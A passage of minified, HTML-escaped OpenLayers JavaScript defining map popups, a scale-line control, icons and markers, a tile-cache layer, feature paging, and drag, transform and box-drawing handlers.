null;this.closeOnMove&amp;&amp;this.map&amp;&amp;this.map.events.unregister("movestart",this,this.hide);this.events.destroy();this.events=null;this.closeDiv&amp;&amp;(OpenLayers.Event.stopObservingElement(this.closeDiv),this.groupDiv.removeChild(this.closeDiv));this.closeDiv=null;this.div.removeChild(this.groupDiv);this.groupDiv=null;null!=this.map&amp;&amp;this.map.removePopup(this);this.panMapIfOutOfView=this.padding=this.maxSize=this.minSize=this.autoSize=this.div=this.map=null},draw:function(a){null==a&amp;&amp;null!=this.lonlat&amp;&amp;null!= this.map&amp;&amp;(a=this.map.getLayerPxFromLonLat(this.lonlat));this.closeOnMove&amp;&amp;this.map.events.register("movestart",this,this.hide);this.disableFirefoxOverflowHack||"firefox"!=OpenLayers.BROWSER_NAME||(this.map.events.register("movestart",this,function(){var a=document.defaultView.getComputedStyle(this.contentDiv,null).getPropertyValue("overflow");"hidden"!=a&amp;&amp;(this.contentDiv._oldOverflow=a,this.contentDiv.style.overflow="hidden")}),this.map.events.register("moveend",this,function(){var a=this.contentDiv._oldOverflow; a&amp;&amp;(this.contentDiv.style.overflow=a,this.contentDiv._oldOverflow=null)}));this.moveTo(a);this.autoSize||this.size||this.setSize(this.contentSize);this.setBackgroundColor();this.setOpacity();this.setBorder();this.setContentHTML();this.panMapIfOutOfView&amp;&amp;this.panIntoView();return this.div},updatePosition:function(){if(this.lonlat&amp;&amp;this.map){var a=this.map.getLayerPxFromLonLat(this.lonlat);a&amp;&amp;this.moveTo(a)}},moveTo:function(a){null!=a&amp;&amp;null!=this.div&amp;&amp;(this.div.style.left=a.x+"px",this.div.style.top= a.y+"px")},visible:function(){return OpenLayers.Element.visible(this.div)},toggle:function(){this.visible()?this.hide():this.show()},show:function(){this.div.style.display="";this.panMapIfOutOfView&amp;&amp;this.panIntoView()},hide:function(){this.div.style.display="none"},setSize:function(a){this.size=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width), c=c+(e+b.right);this.size.w+=c;this.size.h+=d;"msie"==OpenLayers.BROWSER_NAME&amp;&amp;(this.contentSize.w+=b.left+b.right,this.contentSize.h+=b.bottom+b.top);null!=this.div&amp;&amp;(this.div.style.width=this.size.w+"px",this.div.style.height=this.size.h+"px");null!=this.contentDiv&amp;&amp;(this.contentDiv.style.width=a.w+"px",this.contentDiv.style.height=a.h+"px")},updateSize:function(){var a="&lt;div class='"+this.contentDisplayClass+"'>"+this.contentDiv.innerHTML+"&lt;/div>",b=this.map?this.map.div:document.body,c=OpenLayers.Util.getRenderedDimensions(a, null,{displayClass:this.displayClass,containerElement:b}),d=this.getSafeContentSize(c),e=null;d.equals(c)?e=c:(c={w:d.w&lt;c.w?d.w:null,h:d.h&lt;c.h?d.h:null},c.w&amp;&amp;c.h?e=d:(a=OpenLayers.Util.getRenderedDimensions(a,c,{displayClass:this.contentDisplayClass,containerElement:b}),"hidden"!=OpenLayers.Element.getStyle(this.contentDiv,"overflow")&amp;&amp;a.equals(d)&amp;&amp;(d=OpenLayers.Util.getScrollbarWidth(),c.w?a.h+=d:a.w+=d),e=this.getSafeContentSize(a)));this.setSize(e)},setBackgroundColor:function(a){void 0!=a&amp;&amp;(this.backgroundColor= a);null!=this.div&amp;&amp;(this.div.style.backgroundColor=this.backgroundColor)},setOpacity:function(a){void 0!=a&amp;&amp;(this.opacity=a);null!=this.div&amp;&amp;(this.div.style.opacity=this.opacity,this.div.style.filter="alpha(opacity="+100*this.opacity+")")},setBorder:function(a){void 0!=a&amp;&amp;(this.border=a);null!=this.div&amp;&amp;(this.div.style.border=this.border)},setContentHTML:function(a){null!=a&amp;&amp;(this.contentHTML=a);null!=this.contentDiv&amp;&amp;(null!=this.contentHTML&amp;&amp;this.contentHTML!=this.contentDiv.innerHTML)&amp;&amp;(this.contentDiv.innerHTML= this.contentHTML,this.autoSize&amp;&amp;(this.registerImageListeners(),this.updateSize()))},registerImageListeners:function(){for(var a=function(){null!==this.popup.id&amp;&amp;(this.popup.updateSize(),this.popup.visible()&amp;&amp;this.popup.panMapIfOutOfView&amp;&amp;this.popup.panIntoView(),OpenLayers.Event.stopObserving(this.img,"load",this.img._onImgLoad))},b=this.contentDiv.getElementsByTagName("img"),c=0,d=b.length;c&lt;d;c++){var e=b[c];if(0==e.width||0==e.height)e._onImgLoad=OpenLayers.Function.bind(a,{popup:this,img:e}), OpenLayers.Event.observe(e,"load",e._onImgLoad)}},getSafeContentSize:function(a){a=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width),c=c+(e+b.right);this.minSize&amp;&amp;(a.w=Math.max(a.w,this.minSize.w-c),a.h=Math.max(a.h,this.minSize.h-d));this.maxSize&amp;&amp;(a.w=Math.min(a.w,this.maxSize.w-c),a.h=Math.min(a.h,this.maxSize.h- d));if(this.map&amp;&amp;this.map.size){e=b=0;if(this.keepInMap&amp;&amp;!this.panMapIfOutOfView)switch(e=this.map.getPixelFromLonLat(this.lonlat),this.relativePosition){case "tr":b=e.x;e=this.map.size.h-e.y;break;case "tl":b=this.map.size.w-e.x;e=this.map.size.h-e.y;break;case "bl":b=this.map.size.w-e.x;e=e.y;break;case "br":b=e.x;e=e.y;break;default:b=e.x,e=this.map.size.h-e.y}d=this.map.size.h-this.map.paddingForPopups.top-this.map.paddingForPopups.bottom-d-e;a.w=Math.min(a.w,this.map.size.w-this.map.paddingForPopups.left- this.map.paddingForPopups.right-c-b);a.h=Math.min(a.h,d)}return a},getContentDivPadding:function(){var a=this._contentDivPadding;a||(null==this.div.parentNode&amp;&amp;(this.div.style.display="none",document.body.appendChild(this.div)),this._contentDivPadding=a=new OpenLayers.Bounds(OpenLayers.Element.getStyle(this.contentDiv,"padding-left"),OpenLayers.Element.getStyle(this.contentDiv,"padding-bottom"),OpenLayers.Element.getStyle(this.contentDiv,"padding-right"),OpenLayers.Element.getStyle(this.contentDiv, "padding-top")),this.div.parentNode==document.body&amp;&amp;(document.body.removeChild(this.div),this.div.style.display=""));return a},addCloseBox:function(a){this.closeDiv=OpenLayers.Util.createDiv(this.id+"_close",null,{w:17,h:17});this.closeDiv.className="olPopupCloseBox";var b=this.getContentDivPadding();this.closeDiv.style.right=b.right+"px";this.closeDiv.style.top=b.top+"px";this.groupDiv.appendChild(this.closeDiv);a=a||function(a){this.hide();OpenLayers.Event.stop(a)};OpenLayers.Event.observe(this.closeDiv, "touchend",OpenLayers.Function.bindAsEventListener(a,this));OpenLayers.Event.observe(this.closeDiv,"click",OpenLayers.Function.bindAsEventListener(a,this))},panIntoView:function(){var a=this.map.getSize(),b=this.map.getViewPortPxFromLayerPx(new OpenLayers.Pixel(parseInt(this.div.style.left),parseInt(this.div.style.top))),c=b.clone();b.x&lt;this.map.paddingForPopups.left?c.x=this.map.paddingForPopups.left:b.x+this.size.w>a.w-this.map.paddingForPopups.right&amp;&amp;(c.x=a.w-this.map.paddingForPopups.right-this.size.w); b.y&lt;this.map.paddingForPopups.top?c.y=this.map.paddingForPopups.top:b.y+this.size.h>a.h-this.map.paddingForPopups.bottom&amp;&amp;(c.y=a.h-this.map.paddingForPopups.bottom-this.size.h);this.map.pan(b.x-c.x,b.y-c.y)},registerEvents:function(){this.events=new OpenLayers.Events(this,this.div,null,!0);this.events.on({mousedown:this.onmousedown,mousemove:this.onmousemove,mouseup:this.onmouseup,click:this.onclick,mouseout:this.onmouseout,dblclick:this.ondblclick,touchstart:function(a){OpenLayers.Event.stop(a,!0)}, scope:this})},onmousedown:function(a){this.mousedown=!0;OpenLayers.Event.stop(a,!0)},onmousemove:function(a){this.mousedown&amp;&amp;OpenLayers.Event.stop(a,!0)},onmouseup:function(a){this.mousedown&amp;&amp;(this.mousedown=!1,OpenLayers.Event.stop(a,!0))},onclick:function(a){OpenLayers.Event.stop(a,!0)},onmouseout:function(a){this.mousedown=!1},ondblclick:function(a){OpenLayers.Event.stop(a,!0)},CLASS_NAME:"OpenLayers.Popup"});OpenLayers.Popup.WIDTH=200;OpenLayers.Popup.HEIGHT=200;OpenLayers.Popup.COLOR="white"; OpenLayers.Popup.OPACITY=1;OpenLayers.Popup.BORDER="0px";OpenLayers.Control.ScaleLine=OpenLayers.Class(OpenLayers.Control,{maxWidth:100,topOutUnits:"km",topInUnits:"m",bottomOutUnits:"mi",bottomInUnits:"ft",eTop:null,eBottom:null,geodesic:!1,draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.eTop||(this.eTop=document.createElement("div"),this.eTop.className=this.displayClass+"Top",this.div.appendChild(this.eTop),this.eTop.style.visibility=""==this.topOutUnits||""==this.topInUnits?"hidden":"visible",this.eBottom=document.createElement("div"), this.eBottom.className=this.displayClass+"Bottom",this.div.appendChild(this.eBottom),this.eBottom.style.visibility=""==this.bottomOutUnits||""==this.bottomInUnits?"hidden":"visible");this.map.events.register("moveend",this,this.update);this.update();return this.div},getBarLen:function(a){var b=parseInt(Math.log(a)/Math.log(10)),b=Math.pow(10,b);a=parseInt(a/b);return(5&lt;a?5:2&lt;a?2:1)*b},update:function(){var a=this.map.getResolution();if(a){var b=this.map.getUnits(),c=OpenLayers.INCHES_PER_UNIT,d=this.maxWidth* a*c[b],e=1;!0===this.geodesic&amp;&amp;(e=(this.map.getGeodesicPixelSize().w||1E-6)*this.maxWidth/(d/c.km),d*=e);var f,g;1E5&lt;d?(f=this.topOutUnits,g=this.bottomOutUnits):(f=this.topInUnits,g=this.bottomInUnits);var h=d/c[f],k=d/c[g],d=this.getBarLen(h),l=this.getBarLen(k),h=d/c[b]*c[f],k=l/c[b]*c[g],b=h/a/e,a=k/a/e;"visible"==this.eBottom.style.visibility&amp;&amp;(this.eBottom.style.width=Math.round(a)+"px",this.eBottom.innerHTML=l+" "+g);"visible"==this.eTop.style.visibility&amp;&amp;(this.eTop.style.width=Math.round(b)+ "px",this.eTop.innerHTML=d+" "+f)}},CLASS_NAME:"OpenLayers.Control.ScaleLine"});OpenLayers.Icon=OpenLayers.Class({url:null,size:null,offset:null,calculateOffset:null,imageDiv:null,px:null,initialize:function(a,b,c,d){this.url=a;this.size=b||{w:20,h:20};this.offset=c||{x:-(this.size.w/2),y:-(this.size.h/2)};this.calculateOffset=d;a=OpenLayers.Util.createUniqueID("OL_Icon_");this.imageDiv=OpenLayers.Util.createAlphaImageDiv(a)},destroy:function(){this.erase();OpenLayers.Event.stopObservingElement(this.imageDiv.firstChild);this.imageDiv.innerHTML="";this.imageDiv=null},clone:function(){return new OpenLayers.Icon(this.url, this.size,this.offset,this.calculateOffset)},setSize:function(a){null!=a&amp;&amp;(this.size=a);this.draw()},setUrl:function(a){null!=a&amp;&amp;(this.url=a);this.draw()},draw:function(a){OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,this.size,this.url,"absolute");this.moveTo(a);return this.imageDiv},erase:function(){null!=this.imageDiv&amp;&amp;null!=this.imageDiv.parentNode&amp;&amp;OpenLayers.Element.remove(this.imageDiv)},setOpacity:function(a){OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,null,null, null,null,null,a)},moveTo:function(a){null!=a&amp;&amp;(this.px=a);null!=this.imageDiv&amp;&amp;(null==this.px?this.display(!1):(this.calculateOffset&amp;&amp;(this.offset=this.calculateOffset(this.size)),OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,{x:this.px.x+this.offset.x,y:this.px.y+this.offset.y})))},display:function(a){this.imageDiv.style.display=a?"":"none"},isDrawn:function(){return this.imageDiv&amp;&amp;this.imageDiv.parentNode&amp;&amp;11!=this.imageDiv.parentNode.nodeType},CLASS_NAME:"OpenLayers.Icon"});OpenLayers.Marker=OpenLayers.Class({icon:null,lonlat:null,events:null,map:null,initialize:function(a,b){this.lonlat=a;var c=b?b:OpenLayers.Marker.defaultIcon();null==this.icon?this.icon=c:(this.icon.url=c.url,this.icon.size=c.size,this.icon.offset=c.offset,this.icon.calculateOffset=c.calculateOffset);this.events=new OpenLayers.Events(this,this.icon.imageDiv)},destroy:function(){this.erase();this.map=null;this.events.destroy();this.events=null;null!=this.icon&amp;&amp;(this.icon.destroy(),this.icon=null)}, draw:function(a){return this.icon.draw(a)},erase:function(){null!=this.icon&amp;&amp;this.icon.erase()},moveTo:function(a){null!=a&amp;&amp;null!=this.icon&amp;&amp;this.icon.moveTo(a);this.lonlat=this.map.getLonLatFromLayerPx(a)},isDrawn:function(){return this.icon&amp;&amp;this.icon.isDrawn()},onScreen:function(){var a=!1;this.map&amp;&amp;(a=this.map.getExtent().containsLonLat(this.lonlat));return a},inflate:function(a){this.icon&amp;&amp;this.icon.setSize({w:this.icon.size.w*a,h:this.icon.size.h*a})},setOpacity:function(a){this.icon.setOpacity(a)}, setUrl:function(a){this.icon.setUrl(a)},display:function(a){this.icon.display(a)},CLASS_NAME:"OpenLayers.Marker"});OpenLayers.Marker.defaultIcon=function(){return new OpenLayers.Icon(OpenLayers.Util.getImageLocation("marker.png"),{w:21,h:25},{x:-10.5,y:-25})};OpenLayers.Layer.TileCache=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,format:"image/png",serverResolutions:null,initialize:function(a,b,c,d){this.layername=c;OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,{},d]);this.extension=this.format.split("/")[1].toLowerCase();this.extension="jpg"==this.extension?"jpeg":this.extension},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.TileCache(this.name,this.url,this.layername,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a])},getURL:function(a){var b=this.getServerResolution(),c=this.maxExtent,d=this.tileSize,e=Math.round((a.left-c.left)/(b*d.w));a=Math.round((a.bottom-c.bottom)/(b*d.h));b=null!=this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,b):this.map.getZoom();e=[this.layername,OpenLayers.Number.zeroPad(b,2),OpenLayers.Number.zeroPad(parseInt(e/1E6),3),OpenLayers.Number.zeroPad(parseInt(e/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(e)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a/1E6), 3),OpenLayers.Number.zeroPad(parseInt(a/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a)%1E3,3)+"."+this.extension].join("/");b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(e,b));b="/"==b.charAt(b.length-1)?b:b+"/";return b+e},CLASS_NAME:"OpenLayers.Layer.TileCache"});OpenLayers.Strategy.Paging=OpenLayers.Class(OpenLayers.Strategy,{features:null,length:10,num:null,paging:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on({beforefeaturesadded:this.cacheFeatures,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.clearCache(),this.layer.events.un({beforefeaturesadded:this.cacheFeatures,scope:this}));return a},cacheFeatures:function(a){this.paging||(this.clearCache(), this.features=a.features,this.pageNext(a))},clearCache:function(){if(this.features)for(var a=0;a&lt;this.features.length;++a)this.features[a].destroy();this.num=this.features=null},pageCount:function(){return Math.ceil((this.features?this.features.length:0)/this.length)},pageNum:function(){return this.num},pageLength:function(a){a&amp;&amp;0&lt;a&amp;&amp;(this.length=a);return this.length},pageNext:function(a){var b=!1;this.features&amp;&amp;(null===this.num&amp;&amp;(this.num=-1),b=this.page((this.num+1)*this.length,a));return b},pagePrevious:function(){var a= !1;this.features&amp;&amp;(null===this.num&amp;&amp;(this.num=this.pageCount()),a=this.page((this.num-1)*this.length));return a},page:function(a,b){var c=!1;if(this.features&amp;&amp;0&lt;=a&amp;&amp;a&lt;this.features.length){var d=Math.floor(a/this.length);d!=this.num&amp;&amp;(this.paging=!0,c=this.features.slice(a,a+this.length),this.layer.removeFeatures(this.layer.features),this.num=d,b&amp;&amp;b.features?b.features=c:this.layer.addFeatures(c),this.paging=!1,c=!0)}return c},CLASS_NAME:"OpenLayers.Strategy.Paging"});OpenLayers.Control.DragFeature=OpenLayers.Class(OpenLayers.Control,{geometryTypes:null,onStart:function(a,b){},onDrag:function(a,b){},onComplete:function(a,b){},onEnter:function(a){},onLeave:function(a){},documentDrag:!1,layer:null,feature:null,dragCallbacks:{},featureCallbacks:{},lastPixel:null,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.handlers={drag:new OpenLayers.Handler.Drag(this,OpenLayers.Util.extend({down:this.downFeature,move:this.moveFeature, up:this.upFeature,out:this.cancel,done:this.doneDragging},this.dragCallbacks),{documentDrag:this.documentDrag}),feature:new OpenLayers.Handler.Feature(this,this.layer,OpenLayers.Util.extend({click:this.clickFeature,clickout:this.clickoutFeature,over:this.overFeature,out:this.outFeature},this.featureCallbacks),{geometryTypes:this.geometryTypes})}},clickFeature:function(a){this.handlers.feature.touch&amp;&amp;(!this.over&amp;&amp;this.overFeature(a))&amp;&amp;(this.handlers.drag.dragstart(this.handlers.feature.evt),this.handlers.drag.stopDown= !1)},clickoutFeature:function(a){this.handlers.feature.touch&amp;&amp;this.over&amp;&amp;(this.outFeature(a),this.handlers.drag.stopDown=!0)},destroy:function(){this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])},activate:function(){return this.handlers.feature.activate()&amp;&amp;OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.handlers.drag.deactivate();this.handlers.feature.deactivate();this.feature=null;this.dragging=!1;this.lastPixel=null;OpenLayers.Element.removeClass(this.map.viewPortDiv, this.displayClass+"Over");return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},overFeature:function(a){var b=!1;this.handlers.drag.dragging?this.over=this.feature.id==a.id?!0:!1:(this.feature=a,this.handlers.drag.activate(),this.over=b=!0,OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass+"Over"),this.onEnter(a));return b},downFeature:function(a){this.lastPixel=a;this.onStart(this.feature,a)},moveFeature:function(a){var b=this.map.getResolution();this.feature.geometry.move(b* (a.x-this.lastPixel.x),b*(this.lastPixel.y-a.y));this.layer.drawFeature(this.feature);this.lastPixel=a;this.onDrag(this.feature,a)},upFeature:function(a){this.over||this.handlers.drag.deactivate()},doneDragging:function(a){this.onComplete(this.feature,a)},outFeature:function(a){this.handlers.drag.dragging?this.feature.id==a.id&amp;&amp;(this.over=!1):(this.over=!1,this.handlers.drag.deactivate(),OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass+"Over"),this.onLeave(a),this.feature=null)}, cancel:function(){this.handlers.drag.deactivate();this.over=!1},setMap:function(a){this.handlers.drag.setMap(a);this.handlers.feature.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},CLASS_NAME:"OpenLayers.Control.DragFeature"});OpenLayers.Control.TransformFeature=OpenLayers.Class(OpenLayers.Control,{geometryTypes:null,layer:null,preserveAspectRatio:!1,rotate:!0,feature:null,renderIntent:"temporary",rotationHandleSymbolizer:null,box:null,center:null,scale:1,ratio:1,rotation:0,handles:null,rotationHandles:null,dragControl:null,irregular:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.rotationHandleSymbolizer||(this.rotationHandleSymbolizer={stroke:!1,pointRadius:10,fillOpacity:0, cursor:"pointer"});this.createBox();this.createControl()},activate:function(){var a=!1;OpenLayers.Control.prototype.activate.apply(this,arguments)&amp;&amp;(this.dragControl.activate(),this.layer.addFeatures([this.box]),this.rotate&amp;&amp;this.layer.addFeatures(this.rotationHandles),this.layer.addFeatures(this.handles),a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.layer.removeFeatures(this.handles),this.rotate&amp;&amp;this.layer.removeFeatures(this.rotationHandles), this.layer.removeFeatures([this.box]),this.dragControl.deactivate(),a=!0);return a},setMap:function(a){this.dragControl.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},setFeature:function(a,b){b=OpenLayers.Util.applyDefaults(b,{rotation:0,scale:1,ratio:1});var c=this.rotation,d=this.center;OpenLayers.Util.extend(this,b);if(!1!==this.events.triggerEvent("beforesetfeature",{feature:a})){this.feature=a;this.activate();this._setfeature=!0;var e=this.feature.geometry.getBounds();this.box.move(e.getCenterLonLat()); this.box.geometry.rotate(-c,d);this._angle=0;this.rotation?(c=a.geometry.clone(),c.rotate(-this.rotation,this.center),c=new OpenLayers.Feature.Vector(c.getBounds().toGeometry()),c.geometry.rotate(this.rotation,this.center),this.box.geometry.rotate(this.rotation,this.center),this.box.move(c.geometry.getBounds().getCenterLonLat()),c=c.geometry.components[0].components[0].getBounds().getCenterLonLat()):c=new OpenLayers.LonLat(e.left,e.bottom);this.handles[0].move(c);delete this._setfeature;this.events.triggerEvent("setfeature", {feature:a})}},unsetFeature:function(){this.active?this.deactivate():(this.feature=null,this.rotation=0,this.ratio=this.scale=1)},createBox:function(){var a=this;this.center=new OpenLayers.Geometry.Point(0,0);this.box=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([new OpenLayers.Geometry.Point(-1,-1),new OpenLayers.Geometry.Point(0,-1),new OpenLayers.Geometry.Point(1,-1),new OpenLayers.Geometry.Point(1,0),new OpenLayers.Geometry.Point(1,1),new OpenLayers.Geometry.Point(0,1),new OpenLayers.Geometry.Point(-1, 1),new OpenLayers.Geometry.Point(-1,0),new OpenLayers.Geometry.Point(-1,-1)]),null,"string"==typeof this.renderIntent?null:this.renderIntent);this.box.geometry.move=function(b,c){a._moving=!0;OpenLayers.Geometry.LineString.prototype.move.apply(this,arguments);a.center.move(b,c);delete a._moving};for(var b=function(a,b){OpenLayers.Geometry.Point.prototype.move.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.move(a,b);this._handle.geometry.move(a,b)},c=function(a,b,c){OpenLayers.Geometry.Point.prototype.resize.apply(this, arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.resize(a,b,c);this._handle.geometry.resize(a,b,c)},d=function(a,b){OpenLayers.Geometry.Point.prototype.rotate.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.rotate(a,b);this._handle.geometry.rotate(a,b)},e=function(b,c){var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving){var f=a.dragControl.handlers.drag.evt,g=!(!a._setfeature&amp;&amp;a.preserveAspectRatio)&amp;&amp;!(f&amp;&amp;f.shiftKey), h=new OpenLayers.Geometry.Point(d,e),f=a.center;this.rotate(-a.rotation,f);h.rotate(-a.rotation,f);var k=this.x-f.x,l=this.y-f.y,m=k-(this.x-h.x),n=l-(this.y-h.y);a.irregular&amp;&amp;!a._setfeature&amp;&amp;(k-=(this.x-h.x)/2,l-=(this.y-h.y)/2);this.x=d;this.y=e;h=1;g?(l=1E-5>Math.abs(n)?1:l/n,h=(1E-5>Math.abs(m)?1:k/m)/l):(m=Math.sqrt(m*m+n*n),l=Math.sqrt(k*k+l*l)/m);a._moving=!0;a.box.geometry.rotate(-a.rotation,f);delete a._moving;a.box.geometry.resize(l,f,h);a.box.geometry.rotate(a.rotation,f);a.transformFeature({scale:l, ratio:h});a.irregular&amp;&amp;!a._setfeature&amp;&amp;(k=f.clone(),k.x+=1E-5>Math.abs(d-f.x)?0:this.x-d,k.y+=1E-5>Math.abs(e-f.y)?0:this.y-e,a.box.geometry.move(this.x-d,this.y-e),a.transformFeature({center:k}))}},f=function(b,c){var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving){var f=a.dragControl.handlers.drag.evt,f=f&amp;&amp;f.shiftKey?45:1,g=a.center,h=this.x-g.x,k=this.y-g.y;this.x=d;this.y=e;d=Math.atan2(k-c,h-b);d=Math.atan2(k,h)-d;d*=180/Math.PI;a._angle=(a._angle+d)% 360;d=a.rotation%f;if(Math.abs(a._angle)>=f||0!==d)d=Math.round(a._angle/f)*f-d,a._angle=0,a.box.geometry.rotate(d,g),a.transformFeature({rotation:d})}},g=Array(8),h=Array(4),k,l,m,n="sw s se e ne n nw w".split(" "),p=0;8>p;++p)k=this.box.geometry.components[p],l=new OpenLayers.Feature.Vector(k.clone(),{role:n[p]+"-resize"},"string"==typeof this.renderIntent?null:this.renderIntent),0==p%2&amp;&amp;(m=new OpenLayers.Feature.Vector(k.clone(),{role:n[p]+"-rotate"},"string"==typeof this.rotationHandleSymbolizer? null:this.rotationHandleSymbolizer),m.geometry.move=f,k._rotationHandle=m,h[p/2]=m),k.move=b,k.resize=c,k.rotate=d,l.geometry.move=e,k._handle=l,g[p]=l;this.rotationHandles=h;this.handles=g},createControl:function(){var a=this;this.dragControl=new OpenLayers.Control.DragFeature(this.layer,{documentDrag:!0,moveFeature:function(b){this.feature===a.feature&amp;&amp;(this.feature=a.box);OpenLayers.Control.DragFeature.prototype.moveFeature.apply(this,arguments)},onDrag:function(b,c){b===a.box&amp;&amp;a.transformFeature({center:a.center})}, onStart:function(b,c){var d=!a.geometryTypes||-1!==OpenLayers.Util.indexOf(a.geometryTypes,b.geometry.CLASS_NAME),e=OpenLayers.Util.indexOf(a.handles,b),e=e+OpenLayers.Util.indexOf(a.rotationHandles,b);b!==a.feature&amp;&amp;(b!==a.box&amp;&amp;-2==e&amp;&amp;d)&amp;&amp;a.setFeature(b)},onComplete:function(b,c){a.events.triggerEvent("transformcomplete",{feature:a.feature})}})},drawHandles:function(){for(var a=this.layer,b=0;8>b;++b)this.rotate&amp;&amp;0===b%2&amp;&amp;a.drawFeature(this.rotationHandles[b/2],this.rotationHandleSymbolizer),a.drawFeature(this.handles[b], this.renderIntent)},transformFeature:function(a){if(!this._setfeature){this.scale*=a.scale||1;this.ratio*=a.ratio||1;var b=this.rotation;this.rotation=(this.rotation+(a.rotation||0))%360;if(!1!==this.events.triggerEvent("beforetransform",a)){var c=this.feature,d=c.geometry,e=this.center;d.rotate(-b,e);a.scale||a.ratio?d.resize(a.scale,e,a.ratio):a.center&amp;&amp;c.move(a.center.getBounds().getCenterLonLat());d.rotate(this.rotation,e);this.layer.drawFeature(c);c.toState(OpenLayers.State.UPDATE);this.events.triggerEvent("transform", a)}}this.layer.drawFeature(this.box,this.renderIntent);this.drawHandles()},destroy:function(){for(var a,b=0;8>b;++b)a=this.box.geometry.components[b],a._handle.destroy(),a._handle=null,a._rotationHandle&amp;&amp;a._rotationHandle.destroy(),a._rotationHandle=null;this.rotationHandles=this.rotationHandleSymbolizer=this.handles=this.feature=this.center=null;this.box.destroy();this.layer=this.box=null;this.dragControl.destroy();this.dragControl=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)}, CLASS_NAME:"OpenLayers.Control.TransformFeature"});OpenLayers.Handler.Box=OpenLayers.Class(OpenLayers.Handler,{dragHandler:null,boxDivClassName:"olHandlerBoxZoomBox",boxOffsets:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.dragHandler=new OpenLayers.Handler.Drag(this,{down:this.startBox,move:this.moveBox,out:this.removeBox,up:this.endBox},{keyMask:this.keyMask})},destroy:function(){OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.dragHandler&amp;&amp;(this.dragHandler.destroy(),this.dragHandler= null)},setMap:function(a){OpenLayers.Handler.prototype.setMap.apply(this,arguments);this.dragHandler&amp;&amp;this.dragHandler.setMap(a)},startBox:function(a){this.callback("start",[]);this.zoomBox=OpenLayers.Util.createDiv("zoomBox",{x:-9999,y:-9999});this.zoomBox.className=this.boxDivClassName;this.zoomBox.style.zIndex=this.map.Z_INDEX_BASE.Popup-1;this.map.viewPortDiv.appendChild(this.zoomBox);OpenLayers.Element.addClass(this.map.viewPortDiv,"olDrawBox")},moveBox:function(a){var b=this.dragHandler.start.x, c=this.dragHandler.start.y,d=Math.abs(b-a.x),e=Math.abs(c-a.y),f=this.getBoxOffsets();this.zoomBox.style.width=d+f.width+1+"px";this.zoomBox.style.height=e+f.height+1+"px";this.zoomBox.style.left=(a.x&lt;b?b-d-f.left:b-f.left)+"px";this.zoomBox.style.top=(a.y&lt;c?c-e-f.top:c-f.top)+"px"},endBox:function(a){var b;if(5&lt;Math.abs(this.dragHandler.start.x-a.x)||5&lt;Math.abs(this.dragHandler.start.y-a.y)){var c=this.dragHandler.start;b=Math.min(c.y,a.y);var d=Math.max(c.y,a.y),e=Math.min(c.x,a.x);a=Math.max(c.x, a.x);b=new OpenLayers.Bounds(e,d,a,b)}else b=this.dragHandler.start.clone();this.removeBox();this.callback("done",[b])},removeBox:function(){this.map.viewPortDiv.removeChild(this.zoomBox);this.boxOffsets=this.zoomBox=null;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDrawBox")},activate:function(){return OpenLayers.Handler.prototype.activate.apply(this,arguments)?(this.dragHandler.activate(),!0):!1},deactivate:function(){return OpenLayers.Handler.prototype.deactivate.apply(this,arguments)? (this.dragHandler.deactivate()&amp;&amp;this.zoomBox&amp;&amp;this.removeBox(),!0):!1},getBoxOffsets:function(){if(!this.boxOffsets){var a=document.createElement("div");a.style.position="absolute";a.style.border="1px solid black";a.style.width="3px";document.body.appendChild(a);var b=3==a.clientWidth;document.body.removeChild(a);var a=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-left-width")),c=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-right-width")),d=parseInt(OpenLayers.Element.getStyle(this.zoomBox, 